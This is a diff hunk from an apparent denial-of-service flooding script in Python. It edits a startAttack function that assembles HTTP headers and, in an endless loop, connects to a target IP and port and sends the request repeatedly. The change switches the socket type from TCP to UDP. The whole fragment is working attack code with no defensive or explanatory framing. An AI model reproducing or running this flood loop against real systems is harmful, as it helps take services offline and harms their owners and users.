@@ -47,7 +47,7 @@ def startAttack():
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      atk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       atk.connect((ip, port))
       for y in range(times): # Start attack
           atk.send(str.encode(request))
